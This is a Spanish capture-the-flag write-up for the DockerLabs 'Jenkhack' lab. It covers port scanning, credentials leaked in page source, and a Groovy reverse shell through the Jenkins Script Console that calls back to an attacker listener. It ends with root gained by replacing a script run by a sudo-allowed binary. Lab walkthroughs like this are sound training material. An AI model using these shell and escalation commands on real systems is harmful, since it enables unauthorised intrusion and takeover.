# DockerLabs - Jenkhack

Laboratorio para practicar la explotación de Jenkins mediante la consola de scripts para obtener una reverse shell y escalar privilegios.

## Despliegue

```bash
bash auto_deploy.sh jenkhack.tar
```

## Reconocimiento

Añadimos el dominio al `/etc/hosts`:

```bash
echo "172.17.0.2 jenkhack.hl" >> /etc/hosts
```

Empezamos con un escaneo de puertos:

```bash
nmap -sCV -p- 172.17.0.2
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 80/tcp | http | Apache httpd 2.4.58 (Ubuntu) |
| 443/tcp | ssl/http | Jetty 10.0.13 |
| 8080/tcp | http | Jetty 10.0.13 |

El puerto 80 aloja una página de presentación con Apache. Los puertos 443 y 8080 corren Jetty, el servidor embebido de **Jenkins**. Ambos exponen `robots.txt` con el comentario `"we don't want robots to click 'build' links"`, pista directa al panel de construcción de Jenkins.

## Enumeración

Revisamos el código fuente del puerto 80 (`http://172.17.0.2`) y encontramos credenciales embebidas en atributos `alt` de imágenes:

```
jenkins-admin:cassandra
```

Accedemos al panel de Jenkins en `http://172.17.0.2:8080` con estas credenciales.

## Explotación

Desde el panel de Jenkins, navegamos a **Manage Jenkins → Script Console** (`/script`).

Ponemos un listener en nuestra máquina:

```bash
nc -lvnp 4444
```

Ejecutamos la reverse shell en Groovy desde la Script Console:

```groovy
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"].execute()
```

Obtenemos shell como el usuario de Jenkins. Sanitizamos la terminal:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 50 cols 184
```



## Post-explotación / Escalada de privilegios

En el directorio `/var/www/jenkhack/` encontramos un `note.txt` con credenciales ofuscadas:

```
jenkhack:C1V9uBl8!Cl*uDfP
```

El valor de la contraseña está codificado en **Base85**. Lo decodificamos con CyberChef (From Base85) y obtenemos:

```
jenkinselmejor
```

Nos movemos al usuario `jenkhack`:

```bash
su jenkhack
# Password: jenkinselmejor
```

Comprobamos permisos sudo:

```bash
sudo -l
```

```
(ALL : ALL) NOPASSWD: /usr/local/bin/bash
```

Escalamos a `jenkhack` y comprobamos sudo:

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/local/bin/bash
```

`/usr/local/bin/bash` es un binario compilado que internamente llama a `system("/opt/bash.sh")`. No podemos modificar el binario ni el script directamente, pero el directorio `/opt/` tiene permisos de escritura para `jenkhack`.

Borramos el script original y creamos uno malicioso:

```bash
rm /opt/bash.sh
echo '#!/bin/bash' > /opt/bash.sh
echo '/bin/bash -p' >> /opt/bash.sh
chmod +x /opt/bash.sh
sudo /usr/local/bin/bash
```

El binario ejecuta nuestro script como root vía `system()` y obtenemos shell de root.

## Flags

| Flag | Hash |
|------|------|
| user.txt | 3635ccd7044e99813883c8a1b95ced04 |
